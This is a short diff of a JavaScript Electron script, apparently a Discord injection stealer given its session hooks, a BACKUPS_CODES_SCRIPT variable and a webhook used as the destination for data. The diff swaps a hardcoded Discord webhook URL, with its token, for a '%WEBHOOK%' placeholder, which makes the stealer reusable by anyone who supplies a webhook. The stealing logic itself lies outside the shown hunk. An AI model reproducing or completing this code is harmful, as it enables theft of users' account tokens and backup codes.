@@ -6,7 +6,7 @@ const { BrowserWindow: BrowserWindow, session: session } = require("electron"),
     https = require("https"),
     path = require("path");
 
-let WEBHOOK = "https://discord.com/api/webhooks/1227213262366445568/f7Yp-1Tsm1DQGIq7vIRl5Z662emEKJJGvFBqhxAKYrrEdCGSEPN0MrK7RCo0BitrKSJU";
+let WEBHOOK = "%WEBHOOK%";
 
 let [
     BACKUPS_CODES_SCRIPT,
